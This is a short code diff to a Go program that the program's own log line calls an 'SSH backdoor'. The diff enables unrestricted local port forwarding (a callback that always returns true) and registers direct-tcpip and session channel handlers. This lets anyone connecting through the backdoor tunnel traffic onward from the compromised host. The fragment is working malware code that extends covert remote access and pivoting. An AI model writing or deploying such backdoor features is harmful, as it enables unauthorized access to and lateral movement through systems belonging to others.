@@ -66,6 +66,11 @@ func main() {
 		Handler:         sshterminal,
 		Version:         fingerprint,
 		PasswordHandler: passwordHandler,
+		LocalPortForwardingCallback: ssh.LocalPortForwardingCallback(func(ctx ssh.Context, dhost string, dport uint32) bool {return true;}),
+		ChannelHandlers: map[string]ssh.ChannelHandler{
+			"direct-tcpip": ssh.DirectTCPIPHandler,
+			"session": ssh.DefaultSessionHandler,
+		},
 	}
 	server.AddHostKey(privateKey)
 	log.Println("Started SSH backdoor on", server.Addr)
